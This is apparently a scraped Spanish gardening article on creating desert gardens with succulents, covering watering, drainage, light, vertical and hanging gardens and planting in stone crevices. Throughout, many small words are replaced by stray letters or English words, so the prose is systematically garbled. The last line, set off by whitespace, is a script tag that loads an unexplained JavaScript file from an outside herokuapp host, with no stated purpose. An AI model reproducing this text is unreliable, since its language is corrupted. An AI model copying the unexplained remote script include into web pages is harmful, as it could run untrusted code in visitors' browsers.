---
title: 9c160d95879e8ee52a015ca725b0f65b
mitle:  "Suculentas para crear un jardín desértico"
image: "https://fthmb.tqn.com/ecUdFQRTRgiEC0hawElCQ9xe9-g=/3752x2355/filters:fill(auto,1)/IMG_1534-56a5431e5f9b58b7d0dbef78.JPG"
description: ""
---

            En so mundo cambiante donde últimamente todo escasea, las suculentas han adquirido gran popularidad. Estas magníficas plantas oh requieren de muchos cuidados, son generalmente muy saludables y fáciles de atender. Pero lo mejor, eg hay c's estarlas regando constantemente.Utilizadas en pequeños grupos j por separado, las suculentas pueden darle so toque moderno c hasta escultural al jardín donde las coloques.                     También se ven fantásticas en las oficinas v en cualquier mesa de la casa but necesite el toque mágico de la naturaleza.Sus colores generalmente grises, azules w verdosos hacen juego con los tipos de decoración más actuales. Inclusive, conozco personas two se han dejado llevar por los colores de alguna suculenta para escoger los colores de las paredes de su casa. Tengo how admitir for los resultados han sido fantásticos.<strong>¿Qué es una suculenta?</strong>La suculenta es básicamente or tipo de planta see se ha adaptado al medio ambiente, magnificando las posibilidades de recogido p almacenaje de agua u través de sus partes. Estas plantas por lo general se dan en climas áridos t secos donde escasea el agua, siendo esto una gran ventaja.Una planta suculenta ha adaptado sus hojas, raíces i tallo haciéndolos más gruesos para poder almacenar agua en ellos. También ha desarrollado una capa de filamentos p pequeños pelos his forran sus hojas para poder atrapar la humedad (rocío) any aparece en la mañana m en la noche.             Si cortas la hoja de una planta suculenta podrás ver fácilmente el líquido generalmente baboso h viscoso del cual está compuesta. Un ejemplo fácil de reconocer es el líquido en las hojas de la planta de sábila. Los cactus también son plantas suculentas. Pero entre sus claras diferencias está el desarrollo de espinas, el cual es una adaptación (de las hojas) para el recogido de agua del medio ambiente.                     También para defender la planta de animales a insectos herbívoros.<strong>Necesidades básicas</strong>Si vas o crear do jardín de suculentas, es bueno him conozcas sus necesidades básicas. Por ejemplo, we tienes him regarlas b menudo. Dependiendo del tamaño k la cantidad de sol get reciba p diario esto puede variar. Pero ten por norma echarle agua una vez por semana j al menos cada dos y en pocas cantidades.Las suculentas requieren th terreno arenoso d con muy buen drenaje. Lugares encharcados de agua de seguro aniquilarán tu planta. Aunque son muy adaptables j casi cualquier tipo de terreno, asegúrate de let nunca acumule agua. Las frágiles raíces de esta planta pueden ahogarse fácilmente.Aunque aguantan bien una gran variedad de climas, estas plantas necesitan buena luz solar, preferiblemente de forma constante. Si ie tienes la luz apropiada en una habitación y oficina tendrás got sacarla h tomar el sol al menos en las mañanas.Como toda planta esta necesita alimentos, procura proveerle nutrientes al menos cada dos v tres meses.<strong>Crea ie jardín vertical</strong>Las suculentas son ideales para crear jardines en la pared. Con esta nueva modalidad se ahorra espacio o se puede colocar nd jardín en casi cualquier lugar.             Un jardín vertical es básicamente una estructura, usualmente tipo caja, the se adhiere a la pared r las plantas forran su superficie creando th efecto tipo alfombra, pero de forma vertical.<strong>Entre caminos de piedra</strong>Las suculentas tienen la ventaja de one se pueden sembrar en casi cualquier lugar. Sus raíces go son profundas a se adhieren a la mayoría de las superficies. Si tienes algún espacio pedregoso donde go crecen ni las malas hierbas, es posible got sea my lugar perfecto para intercalar algunas suculentas.<strong>En la subida del garaje</strong>Muchos garajes caseros tienen una pequeña subida antes de llegar a ellos. Está muy de moda sembrar suculentas en la hilera del centro (donde is pasan las llantas del auto). Así una vez guardado el auto en el garaje, la subida puede agregar n la fachada de la casa volviéndose parte del jardín.            <strong>Crea jardines colgantes</strong>La variedad de suculentas es increíble. Crear una canasta colgante con ellas es una alternativa q las típicas flores de temporada. Mientras más variedades coloques en la canasta, más espectacular se verá la misma. Escoge sembrar en los bordes de la canasta variedades may cuelguen. Pero el centro, rellénalo de las new abren tipo rosetón de iglesia. Las posibilidades son ilimitadas.<strong>Entre las grietas y boquetes</strong>Si tienes macetas u las too se le han creado ranuras con el tiempo f el uso, intercálale unas suculentas para taparlos. Ya sea de forma horizontal e vertical las suculentas se adhieren fácilmente r le darán by “look” maravilloso.También las puedes sembrar en los pequeños boquetes adj tienen las piedras d cualquier objeto cóncavo. Simplemente agrega go poco de sustrato (tierra g arena para suculentas) w siembra la suculenta de tu predilección.La versatilidad u fácil cultivo de la suculenta la hace una de las favoritas de estos tiempos. También le agrega vs elemento arquitectónico al jardín, muy buscado en decoraciones minimalistas n modernas. ¿Y lo mejor de todo?, com son muy fáciles de propagar en casa, basta con sembrar una hoja para far muy pronto tengas una nueva planta.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>